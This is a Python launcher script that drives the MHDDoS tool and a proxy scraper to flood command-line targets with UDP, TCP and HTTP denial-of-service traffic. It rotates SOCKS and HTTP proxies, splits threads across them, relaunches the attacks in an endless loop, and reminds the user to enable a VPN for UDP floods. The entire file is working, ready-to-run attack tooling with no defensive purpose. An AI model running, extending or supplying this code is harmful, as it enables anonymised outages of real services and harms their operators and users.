import argparse
import multiprocessing
import os
import random
import shutil
import subprocess
import time


def update_proxies(period):
    os.chdir('proxy-scraper-checker')
    if os.path.exists('../MHDDoS/files/proxies'):
        last_update = os.path.getctime('../MHDDoS/files/proxies')
    else:
        last_update = 0
    # Avoid parsing proxies too often when restart happens
    if (time.time() - last_update) > period / 2:
        subprocess.run(['python3', 'main.py'])
        shutil.rmtree('../MHDDoS/files/proxies', ignore_errors=True)
        shutil.move('./proxies', '../MHDDoS/files/')
        print('Proxies updated successfully')
    os.chdir('../')


def calculate_threads(total_threads, total_targets):
    s4_proxies = sum(1 for _ in open('files/proxies/socks4.txt'))
    s5_proxies = sum(1 for _ in open('files/proxies/socks5.txt'))
    http_proxies = sum(1 for _ in open('files/proxies/http.txt'))
    total_proxies = s4_proxies + s5_proxies + http_proxies
    if not total_proxies:
        raise RuntimeError('No proxies found. Check --proxy-timeout and --skip-proxy-init flags')

    threads_per_proxy = total_threads / total_targets / total_proxies
    s4_threads = int(s4_proxies * threads_per_proxy)
    s5_threads = int(s5_proxies * threads_per_proxy)
    http_threads = int(http_proxies * threads_per_proxy)
    return s4_threads, s5_threads, http_threads


def run_ddos(targets, total_threads, period, rpc, udp_threads, http_methods, no_proxies, debug):
    os.chdir('MHDDoS')

    if no_proxies:
        s4_threads, s5_threads, http_threads = 0, 0, 0
    else:
        s4_threads, s5_threads, http_threads = calculate_threads(total_threads, len(targets))

    params_list = []
    for target in targets:
        # UDP
        if target.lower().startswith('udp://'):
            print(f'Make sure VPN is enabled - proxies are not supported for UDP targets: {target}')
            params_list.append(['python3', 'start.py', 'UDP', target[6:], str(udp_threads), str(period)])

        # TCP
        elif target.lower().startswith('tcp://'):
            for socks_type, socks_file, threads in (
                ('4', 'socks4.txt', s4_threads + http_threads // 2),
                ('5', 'socks5.txt', s5_threads + http_threads // 2),
            ):
                params_list.append([
                    'python3', 'start.py', 'TCP', target[6:], str(threads), str(period), socks_type, socks_file
                ])

        # HTTP(S)
        else:
            for socks_type, socks_file, threads in (
                ('4', 'socks4.txt', s4_threads),
                ('5', 'socks5.txt', s5_threads),
                ('1', 'http.txt', http_threads),
            ):
                method = random.choice(http_methods)
                params_list.append([
                    'python3', 'start.py', method, target, socks_type, str(threads), socks_file, str(rpc), str(period)
                ])

    processes = []
    for params in params_list:
        if debug:
            params.append('true')
        processes.append(subprocess.Popen(params))

    for p in processes:
        p.wait()

    os.chdir('../')


def start(total_threads, period, targets, rpc, udp_threads, http_methods, debug):
    shutil.copy('proxy_config.py', 'proxy-scraper-checker/config.py')
    no_proxies = all(target.lower().startswith('udp://') for target in targets)

    while True:
        if not no_proxies:
            update_proxies(period)
        run_ddos(targets, total_threads, period, rpc, udp_threads, http_methods, no_proxies, debug)


def init_argparse() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        'targets',
        nargs='+',
        help='List of targets, separated by spaces',
    )
    parser.add_argument(
        '-t',
        '--threads',
        type=int,
        default=100 * multiprocessing.cpu_count(),
        help='Total number of threads(default is 100 * CPU Cores)',
    )
    parser.add_argument(
        '-p',
        '--period',
        type=int,
        default=600,
        help='How often to update the proxies (default is 300)',
    )
    parser.add_argument(
        '--proxy-timeout',
        metavar='TIMEOUT',
        type=float,
        default=3,
        help='How many seconds to wait for the proxy to make a connection. '
             'Higher values give more proxies, but with lower speed/quality. It also takes more time (default is 3)',
    )
    parser.add_argument(
        '--rpc',
        type=int,
        default=100,
        help='How many requests to send on a single proxy connection (default is 100)',
    )
    parser.add_argument(
        '--udp-threads',
        type=int,
        default=1,
        help='Threads to run per UDP target',
    )
    parser.add_argument(
        '--debug',
        action='store_true',
        default=False,
        help='Enable debug output from MHDDoS',
    )
    parser.add_argument(
        '--http-methods',
        nargs='+',
        default=['GET', 'STRESS', 'BOT', 'DOWNLOADER'],
        help='List of HTTP(s) attack methods to use. Default is GET, STRESS, BOT, DOWNLOADER',
    )
    return parser


if __name__ == '__main__':
    args = init_argparse().parse_args()
    os.putenv('PROXY_TIMEOUT', str(args.proxy_timeout))
    start(
        args.threads,
        args.period,
        args.targets,
        args.rpc,
        args.udp_threads,
        args.http_methods,
        args.debug,
    )
